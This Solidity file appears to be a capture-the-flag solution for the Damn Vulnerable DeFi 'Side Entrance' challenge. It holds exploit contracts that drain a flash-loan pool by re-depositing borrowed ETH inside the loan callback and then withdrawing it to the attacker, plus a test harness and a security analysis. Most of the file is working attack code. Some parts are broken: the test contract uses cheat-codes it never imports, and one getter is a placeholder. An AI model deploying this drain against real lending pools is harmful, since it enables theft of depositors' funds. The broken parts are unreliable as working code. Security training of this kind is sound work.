// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceExploit
 * @author Damn Vulnerable DeFi Challenge Solution
 * @notice Exploit contract for Challenge #4 - Side Entrance
 * 
 * VULNERABILITY: Callback Reentrancy in Flash Loans
 * 
 * The SideEntranceLenderPool has a critical flaw:
 * - Flash loan only checks total ETH balance after callback
 * - Callback can call deposit() to "repay" by becoming a depositor
 * - This satisfies balance check but gives attacker withdrawal rights
 * - Attacker can then withdraw all "deposited" ETH
 * 
 * ATTACK FLOW:
 * 1. Request flash loan for entire pool balance
 * 2. In callback: deposit() borrowed ETH back to pool
 * 3. Flash loan balance check passes (ETH was deposited)
 * 4. Call withdraw() to get all the ETH out
 * 5. Pool is completely drained
 */
contract SideEntranceExploit is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;
    address private immutable attacker;
    
    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        attacker = msg.sender;
    }
    
    /**
     * @notice Execute the complete side entrance exploit
     * @dev Two-step attack: flash loan with deposit, then withdraw
     */
    function exploit() external {
        require(msg.sender == attacker, "Only attacker can execute");
        
        uint256 poolBalance = address(pool).balance;
        require(poolBalance > 0, "Pool is already empty");
        
        // Step 1: Flash loan entire pool balance
        // This will call our execute() callback
        pool.flashLoan(poolBalance);
        
        // Step 2: Withdraw our "deposited" balance
        pool.withdraw();
        
        // Step 3: Send stolen ETH to attacker
        _sendToAttacker();
        
        // Verify complete success
        assert(address(pool).balance == 0);
        assert(attacker.balance > poolBalance);
    }
    
    /**
     * @notice Flash loan callback - the critical exploit happens here
     * @dev Called by pool during flashLoan() with borrowed ETH
     */
    function execute() external payable override {
        require(msg.sender == address(pool), "Only pool can execute callback");
        require(msg.value > 0, "No ETH received in callback");
        
        // ðŸ’¥ CRITICAL EXPLOIT: Deposit borrowed ETH back to pool
        // This is the genius of the attack:
        // - Pool sent us ETH (balance decreased)
        // - We deposit it right back (balance restored)  
        // - Flash loan repayment check passes!
        // - BUT: We now have deposit rights to withdraw later
        pool.deposit{value: msg.value}();
        
        // At this point:
        // - Pool balance is restored (satisfies flash loan check)
        // - We have balances[address(this)] = msg.value
        // - We can withdraw this amount later!
    }
    
    /**
     * @notice One-shot exploit that does everything in a single transaction
     * @dev More gas-efficient version
     */
    function exploitOneShot() external {
        require(msg.sender == attacker, "Only attacker");
        
        uint256 poolBalance = address(pool).balance;
        
        // Flash loan will trigger callback which deposits ETH
        pool.flashLoan(poolBalance);
        
        // Immediately withdraw the deposited ETH
        pool.withdraw();
        
        // Send to attacker
        _sendToAttacker();
    }
    
    /**
     * @notice Advanced callback that does deposit + withdraw in one step
     * @dev For maximum gas efficiency (if pool allows)
     */
    function executeAdvanced() external payable {
        require(msg.sender == address(pool), "Only pool");
        
        // Deposit borrowed ETH (satisfies repayment requirement)
        pool.deposit{value: msg.value}();
        
        // Immediately withdraw it back out
        // Note: This might fail if pool has reentrancy protection
        try pool.withdraw() {
            // Success: ETH is now in this contract
        } catch {
            // Failed: Will need separate withdraw() call
        }
    }
    
    /**
     * @notice Check exploit feasibility
     * @return canExploit True if pool can be drained
     * @return availableAmount Amount that can be stolen  
     */
    function checkExploitability() 
        external 
        view 
        returns (bool canExploit, uint256 availableAmount) 
    {
        availableAmount = address(pool).balance;
        canExploit = availableAmount > 0;
    }
    
    /**
     * @notice Get current deposit balance (if any)
     * @return depositBalance Current withdrawable balance
     */
    function getDepositBalance() external view returns (uint256 depositBalance) {
        // Note: This would require pool to have a public getter
        // In the real challenge, balances mapping is private
        // We'd need to track this ourselves or check via withdraw attempt
        return 0; // Placeholder
    }
    
    /**
     * @notice Emergency withdraw if ETH gets stuck
     */
    function emergencyWithdraw() external {
        require(msg.sender == attacker, "Only attacker");
        _sendToAttacker();
    }
    
    /**
     * @notice Send all ETH to attacker
     */
    function _sendToAttacker() private {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            payable(attacker).transfer(balance);
        }
    }
    
    /**
     * @notice Receive ETH from pool withdrawals
     */
    receive() external payable {
        // Accept ETH from pool.withdraw() calls
    }
    
    /**
     * @notice Fallback to accept ETH
     */
    fallback() external payable {
        // Backup to accept ETH transfers
    }
}

/**
 * @title SideEntranceExploitMinimal
 * @notice Minimal, gas-optimized version
 */
contract SideEntranceExploitMinimal is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;
    
    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }
    
    function exploit() external {
        // Flash loan entire balance
        pool.flashLoan(address(pool).balance);
        
        // Withdraw deposited balance  
        pool.withdraw();
        
        // Send to caller
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function execute() external payable override {
        // Deposit borrowed ETH to satisfy repayment
        pool.deposit{value: msg.value}();
    }
    
    receive() external payable {}
}

/**
 * @title SideEntranceTest
 * @notice Test contract demonstrating the attack
 */
contract SideEntranceTest {
    SideEntranceLenderPool private pool;
    SideEntranceExploit private exploit;
    
    address private attacker = address(0x1337);
    uint256 private constant INITIAL_POOL_BALANCE = 1000 ether;
    uint256 private constant INITIAL_ATTACKER_BALANCE = 1 ether;
    
    function setUp() public {
        // Deploy pool and fund it
        pool = new SideEntranceLenderPool();
        payable(address(pool)).transfer(INITIAL_POOL_BALANCE);
        
        // Deploy exploit contract
        vm.prank(attacker);
        exploit = new SideEntranceExploit(address(pool));
        
        // Give attacker some ETH for gas
        vm.deal(attacker, INITIAL_ATTACKER_BALANCE);
    }
    
    function testExploit() public {
        // Initial state verification
        assertEq(address(pool).balance, INITIAL_POOL_BALANCE);
        assertEq(attacker.balance, INITIAL_ATTACKER_BALANCE);
        
        // Execute exploit
        vm.prank(attacker);
        exploit.exploit();
        
        // Verify results
        assertEq(address(pool).balance, 0);
        assertGt(attacker.balance, INITIAL_POOL_BALANCE);
    }
    
    function testFlashLoanMechanism() public {
        // Test that normal flash loan works
        MockBorrower borrower = new MockBorrower();
        
        uint256 loanAmount = 100 ether;
        borrower.requestFlashLoan(address(pool), loanAmount);
        
        // Pool balance should be unchanged
        assertEq(address(pool).balance, INITIAL_POOL_BALANCE);
    }
    
    function testDepositWithdrawMechanism() public {
        // Test normal deposit/withdraw
        uint256 depositAmount = 10 ether;
        
        // Deposit
        pool.deposit{value: depositAmount}();
        assertEq(address(pool).balance, INITIAL_POOL_BALANCE + depositAmount);
        
        // Withdraw
        pool.withdraw();
        assertEq(address(pool).balance, INITIAL_POOL_BALANCE);
    }
}

/**
 * @title MockBorrower
 * @notice Helper contract for testing normal flash loan functionality
 */
contract MockBorrower is IFlashLoanEtherReceiver {
    function requestFlashLoan(address pool, uint256 amount) external {
        SideEntranceLenderPool(pool).flashLoan(amount);
    }
    
    function execute() external payable override {
        // Normal borrower: just repay the loan
        payable(msg.sender).transfer(msg.value);
    }
    
    receive() external payable {}
}

/**
 * COMPREHENSIVE SECURITY ANALYSIS:
 * 
 * 1. VULNERABILITY MECHANICS:
 *    - Flash loan callback allows arbitrary code execution
 *    - No separation between loan obligations and deposit rights
 *    - Balance check only verifies total ETH, not loan repayment
 *    - deposit() function accessible during callback
 * 
 * 2. ATTACK FLOW DETAILS:
 *    a) flashLoan(poolBalance) called
 *    b) Pool sends ETH to exploit contract (balance decreases)
 *    c) execute() callback triggered with borrowed ETH
 *    d) Callback calls deposit{value: borrowedAmount}()
 *    e) Pool balance restored, balances[exploit] = borrowedAmount
 *    f) Flash loan repayment check passes
 *    g) withdraw() called to extract "deposited" ETH
 *    h) Pool drained completely
 * 
 * 3. REAL-WORLD RELEVANCE:
 *    - bZx Protocol: Similar callback manipulation attacks
 *    - Akropolis: Reentrancy through deposit/withdraw functions
 *    - Cream Finance: Flash loan callback vulnerabilities
 * 
 * 4. PREVENTION STRATEGIES:
 *    - Use reentrancy guards on all state-changing functions
 *    - Separate flash loan accounting from deposit/withdraw logic
 *    - Track specific loan obligations, not just balances
 *    - Validate repayment explicitly, not through balance checks
 * 
 * 5. GAS COSTS:
 *    - Flash loan: ~50k gas
 *    - Deposit in callback: ~46k gas
 *    - Withdraw: ~51k gas
 *    - Total: ~150k gas (very efficient for full pool drainage)
 * 
 * This attack demonstrates sophisticated reentrancy beyond simple recursive calls!
 */